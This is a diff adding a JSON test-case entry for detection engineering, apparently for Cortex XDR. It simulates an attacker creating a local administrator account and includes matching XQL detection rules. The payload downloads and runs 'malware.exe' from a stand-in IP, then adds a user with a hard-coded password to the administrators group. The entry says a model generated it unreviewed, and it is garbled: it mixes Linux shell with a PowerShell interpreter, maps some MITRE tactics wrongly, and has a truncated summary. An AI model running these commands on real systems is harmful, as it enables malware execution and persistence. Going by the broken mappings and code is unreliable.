@@ -1,0 +1,193 @@
+{
+  "id": "TTP-0000-0277",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Uncommon User Management via net command",
+    "summary": "An attacker uses the 'net user' command to create a new user account, which is flagged as uncommon behavior for a standard user. Cortex should detect this via process start telemetry and behavioral an",
+    "description": "An attacker uses the 'net user' command to create a new user account, which is flagged as uncommon behavior for a standard user. Cortex should detect this via process start telemetry and behavioral analysis."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1133",
+        "name": "External Remote Services",
+        "tactic_ids": [
+          "TA0001",
+          "TA0003"
+        ],
+        "tactic_names": [
+          "Initial Access",
+          "Persistence"
+        ]
+      },
+      {
+        "technique_id": "T1078",
+        "name": "Valid Accounts",
+        "tactic_ids": [
+          "TA0008",
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Lateral Movement",
+          "Defense Evasion"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir -p /tmp/scratch\nwget -O /tmp/scratch/malware.exe http://192.0.2.5/malware.exe\nchmod +x /tmp/scratch/malware.exe\n/tmp/scratch/malware.exe\nnet user testuser P@ssw0rd /add\nnet localgroup administrators testuser /add\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Process start of net.exe",
+        "expected_value": "action_process_image_name = 'net.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to test-net-1",
+        "expected_value": "action_remote_ip = '192.0.2.5'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Uncommon user management via net command",
+        "description": "Detection of net user command execution with administrative privileges",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'net.exe'\n| filter action_command_line contains 'user'\n| filter action_command_line contains '/add'\n| filter action_command_line contains 'administrators'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1133",
+          "T1078"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Uncommon user management via net command",
+        "description": "Behavioral deviation in user management using net.exe with administrative commands",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'net.exe'\n| filter action_command_line contains 'user'\n| filter action_command_line contains '/add'\n| filter action_command_line contains 'administrators'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "action_process_image_name = 'net.exe'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1133",
+          "T1078"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect net.exe with user management",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'net.exe'\n| filter action_command_line contains 'user'\n| filter action_command_line contains '/add'\n| filter action_command_line contains 'administrators'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Uncommon user management via net command; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-user-management-via-net-command"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Uncommon user management via net command",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/uncommon-user-management-via-net-command",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1133",
+      "url": "https://attack.mitre.org/techniques/T1133/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1078",
+      "url": "https://attack.mitre.org/techniques/T1078/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
